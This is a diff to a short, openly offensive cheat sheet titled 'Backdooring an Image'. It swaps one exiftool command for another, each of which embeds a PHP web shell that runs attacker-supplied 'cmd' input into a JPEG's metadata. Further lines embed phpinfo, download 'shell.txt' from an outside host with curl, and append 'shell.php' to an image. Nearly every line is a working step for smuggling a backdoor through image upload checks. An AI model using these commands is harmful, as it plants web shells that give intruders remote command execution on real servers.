@@ -1,5 +1,5 @@
 ####Backdooring an Image####
-exiftool -Comment="<?php passthru(\$_GET['cmd']); __halt_compiler(); ?>" /root/imagen.jpg
+exiftool -DocumentName="<h1>Nic0la T3sl4<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" images.jpeg
 exiftool -DocumentName="<?php phpinfo(); __halt_compiler(); ?>" /root/imagen.jpg
 curl -o hidden.txt https://url.website.com/shell.txt
 cat file.jpg shell.php > compress.jpg
